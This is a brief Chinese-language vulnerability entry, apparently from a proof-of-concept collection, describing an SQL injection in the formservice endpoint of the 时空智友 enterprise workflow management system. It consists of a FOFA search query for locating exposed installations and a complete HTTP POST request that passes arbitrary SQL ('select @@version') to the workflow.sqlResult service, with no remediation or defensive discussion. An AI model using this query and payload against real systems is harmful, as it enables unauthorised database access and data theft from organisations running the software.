## 时空智友企业流程化管控系统formservice存在SQL注入漏洞


## fofa
```
body="企业流程化管控系统" && body="密码(Password):"
```


## poc
```
POST /formservice?service=workflow.sqlResult HTTP/1.1
Host:
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3
Connection: keep-alive
Content-Type: application/json
Accept-Encoding: gzip
Content-Length: 50

{"params":{"a":"11"},"sql":"select @@version"}
```
